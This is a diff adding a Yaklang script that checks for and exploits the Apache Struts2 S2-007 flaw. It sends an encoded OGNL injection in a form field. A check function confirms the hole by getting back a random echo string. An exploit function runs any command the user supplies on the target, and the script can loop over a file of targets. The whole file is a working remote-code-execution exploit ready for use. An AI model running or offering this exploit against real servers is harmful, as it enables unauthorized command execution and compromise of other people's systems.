@@ -1,0 +1,64 @@
+//定义检测函数
+func poc(url){
+    random_str = randstr(8)
+    echo_data = "echo+"+random_str
+    check_poc = `'%2b(%23_memberAccess["allowStaticMethodAccess"]%3dtrue,%23foo%3dnew+java.lang.Boolean("false"),%23context["xwork.MethodAccessor.denyMethodExecution"]%3d%23foo,%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('`+echo_data +`').getInputStream()))%2b'`
+
+    req, err = http.Post(
+            url,
+            http.useragent(http.uarand()),
+            http.header("Content-Type","application/x-www-form-urlencoded"),
+            http.body(sprintf("username=test&age=%s",check_poc)),  //TODO 动态获取表单进行测试
+            )
+        if err != nil {
+            return
+        }
+        if re.Match(random_str,http.GetAllBody(req)){
+            log.warn("S2_007 found !!!")
+        }else{
+            log.debug("S2_007 safe !!!")
+        }
+}
+
+//定义利用函数
+func exp(url,cmd){
+    check_poc = `'%2b(%23_memberAccess["allowStaticMethodAccess"]%3dtrue,%23foo%3dnew+java.lang.Boolean("false"),%23context["xwork.MethodAccessor.denyMethodExecution"]%3d%23foo,%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('`+cmd +`').getInputStream()))%2b'`
+    req, err = http.Post(
+            url,
+            http.useragent(http.uarand()),
+            http.header("Content-Type","application/x-www-form-urlencoded"),
+            http.body(sprintf("username=test&age=%s",check_poc)),
+            )
+    http.show(req)
+}
+
+
+if YAK_MAIN {
+    loglevel("info")
+    u = cli.String("u")
+    file = cli.LineDict("f")
+    cmd = cli.String("cmd")
+
+    if u == "" && len(file)<1 {
+        log.info("you need input target -u or -f")
+        return
+    }
+
+    if u != ""{
+        if cmd != ""{
+            exp(u,cmd)
+        }else{
+            poc(u)
+        }
+        return
+    }
+
+    for _,u = range file {
+         if cmd != "" {
+            exp(u,cmd)
+        }else{
+            poc(u)
+        }
+    }
+
+}
